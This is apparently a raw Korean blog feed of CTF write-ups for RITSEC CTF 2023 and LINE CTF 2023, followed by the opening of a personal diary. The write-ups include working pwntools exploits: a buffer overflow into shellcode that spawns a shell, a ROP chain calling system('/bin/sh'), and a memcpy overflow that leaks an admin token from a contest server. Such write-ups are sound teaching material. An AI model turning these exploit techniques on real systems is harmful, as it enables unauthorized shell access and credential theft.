        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1860">https://ctftime.org/event/1860</a></li></ul><blockquote><p>Doesn’t everyone love assembly?<br><code>nc assembly-hopping.challenges.ctf.ritsec.club 1337</code></p></blockquote><ul><li>[132 solves &#x2F; 279 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>일단 보호기법이 아무것도 없다. 그리고 코드 분석을 해보면 <code>gets</code> 함수로 bof가 발생하고 아래와 같은 가젯을 제공해준다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">jmp     rsp</span><br></pre></td></tr></table></figure><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>이 문제는.. 풀이 방법을 설명하기가 어렵다.. </p><p><code>rbp</code> 자리에 <code>AAAAAAAA</code>을 넣고 <code>ret</code> 자리에 <code>jmp rsp</code> 가젯을 넣어주었다. 그러니까 함수가 종료되는 시점에 실행되는 가젯 흐름을 보면 아래와 같다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">leave</span><br><span class="line">ret</span><br><span class="line">jmp rsp</span><br></pre></td></tr></table></figure><p><code>leave</code>가 실행되면서 <code>rbp</code>가 <code>AAAAAAAA</code>로 바뀌고 <code>ret</code> 명령을 실행하면서 <code>jmp rsp</code> 가젯이 <code>rip</code>에 들어가고 <code>rsp</code>가 내려간다. 그러면 <code>jmp rsp</code> 가젯 뒤에 저장된 내용을 가리킨다. 이 자리에 쉘코드를 넣으면 된다.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;ret2win.challenges.ctf.ritsec.club&#x27;, 1337)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">context.binary = ELF(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0xd0</span>+<span class="number">0x8</span>)</span><br><span class="line">payload += p64(<span class="number">0x401156</span>) <span class="comment"># jmp rsp</span></span><br><span class="line"><span class="comment"># payload += asm(&#x27;nop&#x27;) * 16</span></span><br><span class="line">payload += asm(shellcraft.sh()) <span class="comment"># here!</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> RITSEC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RITSEC CTF 2023 - ret2win</title>
      <link href="/230412-ritsecctf2023-1ret2win/"/>
      <url>/230412-ritsecctf2023-1ret2win/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1860">https://ctftime.org/event/1860</a></li></ul><blockquote><p>Are you looking for an exploit dev job. Well apply to the Republic of Potatoes. We are looking for the best hackers out there. Download the binary, find the secret door and remember to pass the right password.<br><code>nc ret2win.challenges.ctf.ritsec.club 1337</code></p></blockquote><ul><li>[208 solves &#x2F; 83 points]</li></ul><p>3월 말 ~ 4월 초에 진행했던 씨텝인데 다른 문제 풀다가 이제 롸업을 적는다..</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>main 함수에서 <code>gets</code> 함수로 인해 bof가 발생한다. 최종적으로 흐름을 돌려야 하는 함수는 아래와 같다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">supersecrettoplevelfunction</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*]  if you figure out my address, you are hired.&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="string">&#x27;\xCA\xFE\xBA\xBE&#x27;</span> &amp;&amp; a2 == <span class="string">&#x27;\xC0\xDE\xBA\xBE&#x27;</span> )</span><br><span class="line">    <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;[!!] You are good but not good enough for my company&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>인자를 잘 맞춰주기만 하면 된다. <code>rdi</code>에 a1에 해당하는 값을 넣어야 하나, a2에 해당하는 값을 넣어야 하나 가끔 고민될 때가 있는데 이럴땐 어셈을 보면 바로 알 수 있다.</p><img src="/images/230412-ritsecctf2023-1ret2win/Screenshot 2023-04-12 at 18.24.54.png" width=400/><br><h3 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;ret2win.challenges.ctf.ritsec.club&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x20</span>+<span class="number">0x8</span>)</span><br><span class="line">payload += p64(<span class="number">0x4012b3</span>) <span class="comment"># pop rdi</span></span><br><span class="line">payload += <span class="string">b&#x27;\xBE\xBA\xFE\xCA\x00\x00\x00\x00&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x4012b1</span>) <span class="comment"># pop rsi</span></span><br><span class="line">payload += <span class="string">b&#x27;\xBE\xBA\xDE\xC0\x00\x00\x00\x00&#x27;</span> + p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># payload += p64(0x40101a) # ret</span></span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;supersecrettoplevelfunction&#x27;</span>])</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="comment"># p.sendlineafter(&#x27;function!!&#x27;,payload)</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> RITSEC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> argument </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LINE CTF 2023 - Simple Blogger (memcpy, +tmi)</title>
      <link href="/230405-linectf2023-simple_blogger/"/>
      <url>/230405-linectf2023-simple_blogger/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1716">https://ctftime.org/event/1716</a></li></ul><blockquote><p>This is my Admin simple blogger. Please take a look and tell me if there are components need to be improved.<br><code>./client_nix 34.146.54.86 10007</code></p></blockquote><ul><li>[25 solves &#x2F; 186 points]</li></ul><p>약속 있어서 대회 때는 참여 못하고 대회 끝나고 풀이해보았다. 정말 열심히 분석한 것에 비해 플래그는 생각보다 쉽게 얻을 수 있었다.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">|</span><br><span class="line">├── agent</span><br><span class="line">│   ├── admin_janitor.py</span><br><span class="line">│   ├── cron</span><br><span class="line">│   ├── Dockerfile</span><br><span class="line">│   └── entrypoint.sh</span><br><span class="line">├── client</span><br><span class="line">│   └── client_nix</span><br><span class="line">├── docker-compose.yml</span><br><span class="line">├── init.sql</span><br><span class="line">├── server</span><br><span class="line">│   ├── Dockerfile</span><br><span class="line">│   ├── flag</span><br><span class="line">│   ├── nsjail</span><br><span class="line">│   ├── nsjail.cfg</span><br><span class="line">│   ├── server_nix</span><br><span class="line">│   └── simple_blogger.db</span><br><span class="line">├── simple_blogger.db</span><br><span class="line">├── start_server.sh</span><br><span class="line">└── stop_server.sh</span><br></pre></td></tr></table></figure><p>일단 문제에서 주어진 파일들을 살펴보자. 서버와 클라이언트가 존재한다. flag는 서버 측에 있는 것으로 보아.. 서버의 취약점을 이용해서 flag를 읽어오거나 쉘을 획득하는 문제일 것이라 생각했다. agent 폴더를 조금 더 빨리 봤으면 코드를 조금 더 빨리 작성할 수 있었을 텐데.. &#x3D;ㅅ&#x3D;</p><p><code>server_nix</code> 을 분석해보자. 먼저 <code>main</code> 이다.</p><img src="/images/230405-linectf2023-simple_blogger/main.png" width=700/><br><p>먼저 read 함수로 buf에 입력을 받고 <code>sub_4014D2</code> 함수에 input 변수와 함께 인자로 들어간다. 저 함수의 역할은 입력받은 buf 변수에서 input 변수로 내용을 복사한다. 그리고 switch 문으로 6가지의 기능을 실행시킬 수 있는데 <code>get_flag</code> 함수가 눈에 띈다. 최종적으로 저 함수를 실행시켜야할 것 같은데 입력값을 어떻게 주면 좋을지 <code>sub_4014D2</code> 함수를 분석했다.</p><img src="/images/230405-linectf2023-simple_blogger/sub_4014D2.png" width=600/><br><p>memcpy 등으로 input 변수에다 여러 데이터들을 복사하는 것을 알 수 있고, 구조체의 구조는 <code>parsing_header</code> 함수를 먼저 분석해서 알 수 있었다.</p><img src="/images/230405-linectf2023-simple_blogger/parsing_header.png" width=500/><br><p>위 함수에서 version, operation, length 오프셋을 알 수 있고 <code>sub_4014D2</code> 함수에서 토큰을 복사하는 과정에서 2번째 오프셋부터 16바이트가 토큰 값이라는 것을 알 수 있었다. 그리고 코드를 더 분석하다보니 length 뒤에는 데이터의 길이가 온다. 아참, length 길이 제한이 있는 것도 기억하자.</p><p>참고로 <code>((*(buf + 18) &lt;&lt; 8) | *(buf + 19))</code>은 빅엔디안으로 수를 표현한 것이다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msg = p64(<span class="number">0x4142434445464748</span>)</span><br><span class="line"></span><br><span class="line">payload = p8(<span class="number">1</span>) <span class="comment"># version  # 0</span></span><br><span class="line">payload += p8(<span class="number">4</span>) <span class="comment"># operation 1~6 # 1</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) <span class="comment"># 16바이트 token # 2</span></span><br><span class="line">payload += p16(<span class="built_in">len</span>(msg), endian=<span class="string">&#x27;big&#x27;</span>) <span class="comment"># 18</span></span><br><span class="line">payload += msg</span><br></pre></td></tr></table></figure><p>이런식으로 operation과 msg 값을 바꿔주면서 내가 원하는 기능을 실행시킬 수 있다. 분석하면서 내가 정리한 구조체는 아래와 같다. 참고로 구조체는 한 번에 정리할 수 있는 것이 아니라 다른 함수들도 보면서 정리할 수 있다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">InputMessage</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint8_t</span> version;</span><br><span class="line">  <span class="type">uint8_t</span> operation;</span><br><span class="line">  <span class="type">uint8_t</span> token[<span class="number">16</span>];</span><br><span class="line">  <span class="type">uint8_t</span> size[<span class="number">2</span>];</span><br><span class="line">  <span class="type">uint64_t</span> data_size;</span><br><span class="line">  <span class="type">uint8_t</span> data[<span class="number">1024</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>이제 <code>get_flag</code> 함수를 보고 flag를 실행시켜야할 조건 같은 것이 있는지 살펴보자.</p><img src="/images/230405-linectf2023-simple_blogger/get_flag.png" width=700/><br><p><code>check_auth(token_input)</code>이 1이면 flag를 출력해주는데 이는 priv가 1인 경우, 즉 admin인 경우를 의미한다. 참고로 해당 함수에서 priv를 가져오는 것은 database에서 쿼리를 날려서 가져오는데 아래와 같이 생겼다.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> priv <span class="keyword">FROM</span> sess <span class="keyword">WHERE</span> token <span class="operator">=</span> ?</span><br></pre></td></tr></table></figure><p>한편, admin의 priv가 1이다? 이것은 어디서 세팅될까. <code>login</code> 기능에서 <code>super_admin</code>이면 priv가 0, <code>admin</code>이면 priv가 1, 일반 계정이면 priv를 2로 세팅해주는 함수가 존재한다. 또한 토큰 값을 생성해주고 출력까지 해준다. 만약 <code>admin</code>으로 로그인에 성공하면 자연스럽게 토큰 값을 릭해서 <code>get_flag</code> 함수를 실행시키면 되지 않을까? 라고 생각했다.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sess(token, priv) <span class="keyword">VALUES</span>(?, ?)</span><br></pre></td></tr></table></figure><p>이쯤되어서 문제에서 제공된 <code>init.sql</code>을 살펴보자.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> blog(id <span class="type">INTEGER</span> <span class="keyword">PRIMARY</span> KEY AUTOINCREMENT, name <span class="type">VARCHAR</span>(<span class="number">20</span>), message <span class="type">VARCHAR</span>(<span class="number">500</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> blog(name, message) <span class="keyword">VALUES</span>(<span class="string">&#x27;Super Admin&#x27;</span>, <span class="string">&#x27;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> account(id <span class="type">INTEGER</span> <span class="keyword">PRIMARY</span> KEY AUTOINCREMENT, name <span class="type">VARCHAR</span>(<span class="number">20</span>), <span class="keyword">user</span> <span class="type">VARCHAR</span>(<span class="number">20</span>), pass <span class="type">VARCHAR</span>(<span class="number">20</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> account(name, <span class="keyword">user</span>, pass) <span class="keyword">VALUES</span>(<span class="string">&#x27;super_admin&#x27;</span>, <span class="string">&#x27;super_admin&#x27;</span>, HEX(RANDOMBLOB(<span class="number">16</span>)));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> account(name, <span class="keyword">user</span>, pass) <span class="keyword">VALUES</span>(<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>, HEX(RANDOMBLOB(<span class="number">16</span>)));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> account(name, <span class="keyword">user</span>, pass) <span class="keyword">VALUES</span>(<span class="string">&#x27;guest&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> sess(token <span class="type">BLOB</span>, priv <span class="type">INT</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> sess(token, priv) <span class="keyword">VALUES</span>(RANDOMBLOB(<span class="number">16</span>), <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>아쉽게도 우리는 guest밖에 로그인을 하지 못한다. <code>HEX(RANDOMBLOB(16)</code>은 init.sql이 실행될 때 랜덤한 값으로 전부 다 다르게 들어간다. 그래서 앞에서 한 가설은 사용하지 못했다. guest밖에 로그인을 하지 못한다는 사실을 인지하고 <code>read_msg</code>와 <code>write_msg</code> 기능을 살펴봤는데 본격적인 구현에 앞서 토큰 값과 priv를 확인한다. 즉, 해당 기능을 이용할 수 있는지 권한을 확인하고 있었다. admin이어야 두 기능을 이용할 수 있다.. 그래서 두 기능은 볼 필요가 없었다.</p><p>자 마지막으로 <code>ping</code> 기능..만 남았다.</p><img src="/images/230405-linectf2023-simple_blogger/ping.png" width=700/><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> token <span class="keyword">FROM</span> sess <span class="keyword">WHERE</span> rowid <span class="operator">=</span><span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>위 쿼리로 token을 하나 읽어와서 지역 변수에 저장한다. 그리고 취약점은 바로 아래에서 발생한다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*(ptr + <span class="number">1</span>) = size;</span><br><span class="line"><span class="built_in">memcpy</span>(ptr + <span class="number">0x10</span>, dest, *(ptr + <span class="number">1</span>)); <span class="comment">// bof</span></span><br><span class="line">print_argu(ptr);</span><br></pre></td></tr></table></figure><p>size 값은 우리의 input이기 때문에 overflow가 발생할 가능성이 있다. overflow가 발생하면 <code>dest</code> 뒤에 있는 것도 출력할 수 있다. 마침 <code>dest</code> 뒤에 있는 건 아래와 같이 <code>admin_token</code>이다! 바로 익스 코드를 작성하러 가자.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> dest[<span class="number">4</span>]; <span class="comment">// [rsp+20h] [rbp-40h] BYREF</span></span><br><span class="line">__int64 admin_token; <span class="comment">// [rsp+24h] [rbp-3Ch] BYREF</span></span><br></pre></td></tr></table></figure><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ol><li><code>ping</code> 기능을 이용해 <code>admin_token</code> leak</li><li><code>admin_token</code>을 가지고 <code>get_flag</code> 실행!</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct, os, binascii, time</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./server/server_nix&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.146.54.86&#x27;</span>, <span class="number">10007</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. ping</span></span><br><span class="line">msg = <span class="string">b&#x27;PING&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = p8(<span class="number">1</span>) <span class="comment"># version  # 0</span></span><br><span class="line">payload += p8(<span class="number">1</span>) <span class="comment"># operation 1~6 # 1</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) <span class="comment"># 16바이트 token# 2</span></span><br><span class="line">payload += p16(<span class="number">0x400</span>, endian=<span class="string">&#x27;big&#x27;</span>) <span class="comment"># 18</span></span><br><span class="line"><span class="comment"># payload += p8(0) # 18</span></span><br><span class="line"><span class="comment"># payload += p8(len(msg)+200) # 19 -&gt; length = 8</span></span><br><span class="line">payload += msg</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.send(payload) </span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;PONG&#x27;</span>)</span><br><span class="line">token = p.recv(<span class="number">16</span>)</span><br><span class="line">info(<span class="built_in">repr</span>(token))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. get flag</span></span><br><span class="line"></span><br><span class="line">msg = <span class="string">b&#x27;a&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = p8(<span class="number">1</span>) <span class="comment"># version  # 0</span></span><br><span class="line">payload += p8(<span class="number">6</span>) <span class="comment"># operation 1~6 # 1</span></span><br><span class="line">payload += token <span class="comment"># 16바이트 token# 2</span></span><br><span class="line">payload += p16(<span class="built_in">len</span>(msg), endian=<span class="string">&#x27;big&#x27;</span>) <span class="comment"># 18</span></span><br><span class="line">payload += msg</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.send(payload) </span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><img src="/images/230405-linectf2023-simple_blogger/flag.png" width=500/><br><h2 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h2><p>처음에 agent 폴더를 확인했으면 문제 풀이가 더 빨랐을 것이라 판단된다. agent 폴더에서는 cron을 이용해서 매분마다 admin으로 로그인해서 database 내용을 지우는 역할을 한다. 참고로 이 기능은 <code>ping</code> 함수에 있다. 아무튼 저런 역할을 하는데, 저걸 수행하기 위해 파이썬 스크립트가 하나 들어있었다. </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">auth</span>():</span><br><span class="line">    payload = <span class="string">b&#x27;\x01\x02&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;\x41&#x27;</span>*<span class="number">16</span></span><br><span class="line">    cred = <span class="string">&#x27;&#123;0&#125;:&#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(ADMIN_USER, ADMIN_PASS)</span><br><span class="line">    cred_len = <span class="built_in">len</span>(cred)</span><br><span class="line">    payload += struct.pack(<span class="string">&#x27;&gt;H&#x27;</span>, cred_len)</span><br><span class="line">    payload += cred.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><p>일부분만 가져왔는데, 이걸 빨리 봤으면 구조체를 더 쉽고 빠르게 분석해서 서버의 기능을 조금 더 빨리 트리거할 수 있지 않았을까 라는 생각이 든다. 하지만 덕분에 분석에 대한 자신감을 얻었으니.. 나쁜건 없다고 생각된다.</p><p>그리고 이 cron으로 처음에 익스 방향을 헷갈렸는데, 저 파이썬 스크립트를 실행하면 메모리에 admin의 password가 남아서 <code>ping</code> 함수를 통해 leak할 수 있었다. (물론 로컬에서만.. 도커도 아니고..) 로컬에서만 가능했던 이유는 .. 저 파이썬 스크립트를 익스 코드에 포함시켜 cron하는 것처럼 해줬다. 이렇게 하면 큰일난다. ㅎ 애초에 말도 안되는 생각이니 이해하려고 하지 말자.</p><p>아 그리고 일주일 전에 대회 서버로 문제를 풀 때 guest로도 로그인이 안되는 이슈가 있었다. 대회 중에는 문제 푸는데 지장이 없다고 공지하였다고 한다. 대회 때 풀이하려고 했으면.. <code>ping</code> 함수만 열심히 봤겠지..? 아무튼 이번 기회를 통해 ctf 기간에 열심히 참여해야할 이유를 느꼈다. 기간 내에 풀었으면 더 기분 좋았을 것 같다. 사실 끝나고 풀어도 기분좋긴 하다.</p><p>이 문제를 풀고 그 다음 문제도 열어봤는데 사실 아직까지 익스 코드를 스스로 작성하지 못하였다. 요즘 다른거에 빠져서.. 아무튼 comming soon..</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> LINE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> leak </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023-03-31 Diary</title>
      <link href="/230331-diary/"/>
      <url>/230331-diary/</url>
      
        <content type="html"><![CDATA[<p>벌써 2023년 1분기가 끝났다. 그리고 올해 첫 일기를 써보려고 한다. </p><h2 id="Github-Blog-ISSUE"><a href="#Github-Blog-ISSUE" class="headerlink" title="Github Blog ISSUE"></a>Github Blog ISSUE</h2><p>얼마 전에 이 블로그에 이슈가 있었다. (사실 바로 어제..) localhost에서는 변경사항이 모두 반영되었는데 막상 deploy를 하니 변경사항이 하나도 저장 안된 것이다;; 울 뻔 했다. 하지만 작은 변경사항을 준 뒤에 다시 시도해보니 deploy가 잘 되었다. </p><img src="/images/230331-diary/Screenshot 2023-03-31 at 14.56.53.png" width=500/><br><h2 id="English"><a href="#English" class="headerlink" title="English"></a>English</h2><p>영어 공부를 열심히 하고 있다. 말하는 데 있어서 문장 구조가 헷갈린다? 나는 문법이 부족했고 공부해보니 특히 시제에 대한 이해가 낮았다. <code>The present perfact tense</code> 라는 문법이 있는데 한국어로는 과거분사라고 했던 것 같다. 아무튼 저 시제의 문장을 보면 감이 잘 안왔는데 드디어 감을 잡고 이해를 했다. 10대 때 분명 공부했을 건데 그때는 어떻게 이해했는지 기억이 잘 안난다. </p><p>신기한 것이 공부를 하다보니 나의 약점을 파악할 수 있었다. 영어 공부를 시작하기 전에는 리딩, 리스닝, 스피킹, 롸이팅 중 뭐가 가장 자신있고 부족한지 몰랐다. 하지만 공부를 진행하다 보니 스피킹이 정말정말 부족한 것을 깨달을 수 있었다. 그리고 의외로 리스닝 실력이 가장 좋은 것 같다. 리딩은 관심 있는 주제는 잘 읽히는 것 같다. (모르는 단어가 없어서 그럴 것이라 생각한다.) 요즘 모동숲에 빠졌는데 Reddit에서 모동숲 관련 글이 자주 올라오다보니까 심심할 때 읽으면 재밌다. 사실 재밌다기 보다는 모르는 사실을 알게되거나 귀여운 것들을 볼 수 있게 된다. 스피킹이 가장 부족한 이유가 내가 부끄러움이 많은 성격이기 때문이라고 생각된다. 극복하고 싶은데 생각보다 쉽지 않다.</p><h2 id="ACNH-Animal-Crossing-New-Horizon"><a href="#ACNH-Animal-Crossing-New-Horizon" class="headerlink" title="ACNH (Animal Crossing New Horizon)"></a>ACNH (Animal Crossing New Horizon)</h2><p>작년 말에 